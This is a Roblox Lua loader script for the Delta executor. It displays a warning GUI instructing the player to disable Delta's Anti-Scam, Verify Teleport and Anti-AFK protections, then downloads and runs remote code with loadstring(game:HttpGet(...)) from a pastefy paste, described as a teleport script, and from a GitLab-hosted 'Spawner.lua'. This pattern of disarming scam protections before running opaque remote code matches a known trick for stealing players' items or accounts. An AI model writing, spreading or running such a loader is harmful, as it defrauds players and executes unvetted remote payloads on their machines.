--// Loader Script (Warning -> TP -> Spawner)

--// Services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

-- Remove old GUIs
for _, guiName in pairs({"DeltaWarningGUI", "ConfirmGUI"}) do
    local oldGui = PlayerGui:FindFirstChild(guiName)
    if oldGui then oldGui:Destroy() end
end

-- Main Warning GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "DeltaWarningGUI"
screenGui.ResetOnSpawn = false
screenGui.Parent = PlayerGui

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 400, 0, 220)
mainFrame.Position = UDim2.new(0.5, -200, 0.5, -110)
mainFrame.BackgroundColor3 = Color3.fromRGB(20,20,20)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 14)

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -16, 0, 40)
title.Position = UDim2.new(0, 8, 0, 8)
title.BackgroundTransparency = 1
title.Text = "⚠ Turn off all on Delta settings ⚠"
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.TextColor3 = Color3.fromRGB(255, 85, 85)
title.Parent = mainFrame

local info = Instance.new("TextLabel")
info.Size = UDim2.new(1, -16, 0, 120)
info.Position = UDim2.new(0, 8, 0, 50)
info.BackgroundTransparency = 1
info.Text = "1. Disable Anti-AFK\n2. Disable Verify Teleport\n3. Disable Anti-Scam\n\n✅ After disabling, press OK to continue."
info.TextColor3 = Color3.fromRGB(220,220,220)
info.TextXAlignment = Enum.TextXAlignment.Left
info.TextYAlignment = Enum.TextYAlignment.Top
info.TextSize = 16
info.Font = Enum.Font.Gotham
info.Parent = mainFrame

local okBtn = Instance.new("TextButton")
okBtn.Size = UDim2.new(0, 160, 0, 40)
okBtn.Position = UDim2.new(0.5, -80, 1, -55)
okBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 85)
okBtn.Text = "Okay"
okBtn.TextColor3 = Color3.fromRGB(255,255,255)
okBtn.TextSize = 18
okBtn.Font = Enum.Font.GothamBold
okBtn.Parent = mainFrame
Instance.new("UICorner", okBtn).CornerRadius = UDim.new(0, 10)

-- Confirmation popup
okBtn.MouseButton1Click:Connect(function()
    screenGui:Destroy()

    local confirmGui = Instance.new("ScreenGui")
    confirmGui.Name = "ConfirmGUI"
    confirmGui.ResetOnSpawn = false
    confirmGui.Parent = PlayerGui

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 300, 0, 150)
    frame.Position = UDim2.new(0.5, -150, 0.5, -75)
    frame.BackgroundColor3 = Color3.fromRGB(30,30,30)
    frame.Parent = confirmGui
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, -20, 0, 60)
    label.Position = UDim2.new(0, 10, 0, 10)
    label.BackgroundTransparency = 1
    label.Text = "Did you disable everything in Delta settings?"
    label.TextWrapped = true
    label.Font = Enum.Font.Gotham
    label.TextSize = 16
    label.TextColor3 = Color3.fromRGB(255,255,255)
    label.Parent = frame

    local yesBtn = Instance.new("TextButton")
    yesBtn.Size = UDim2.new(0.5, -15, 0, 40)
    yesBtn.Position = UDim2.new(0, 10, 1, -50)
    yesBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 85)
    yesBtn.Text = "Yes"
    yesBtn.TextColor3 = Color3.fromRGB(255,255,255)
    yesBtn.Font = Enum.Font.GothamBold
    yesBtn.TextSize = 18
    yesBtn.Parent = frame
    Instance.new("UICorner", yesBtn).CornerRadius = UDim.new(0, 8)

    local noBtn = Instance.new("TextButton")
    noBtn.Size = UDim2.new(0.5, -15, 0, 40)
    noBtn.Position = UDim2.new(0.5, 5, 1, -50)
    noBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
    noBtn.Text = "No"
    noBtn.TextColor3 = Color3.fromRGB(255,255,255)
    noBtn.Font = Enum.Font.GothamBold
    noBtn.TextSize = 18
    noBtn.Parent = frame
    Instance.new("UICorner", noBtn).CornerRadius = UDim.new(0, 8)

    -- Yes = run TP first time, then Spawner next time
    yesBtn.MouseButton1Click:Connect(function()
        confirmGui:Destroy()
        if not _G.AlreadyTeleported then
            -- First run → Teleport script
            _G.AlreadyTeleported = true
            loadstring(game:HttpGet("https://pastefy.app/ESqWIOfA/raw"))()
        else
            -- Second run → Spawner script
            local Spawner = loadstring(game:HttpGet("https://gitlab.com/darkiedarkie/dark/-/raw/main/Spawner.lua"))()
            Spawner.Load()
        end
    end)

    noBtn.MouseButton1Click:Connect(function()
        confirmGui:Destroy()
    end)
end)
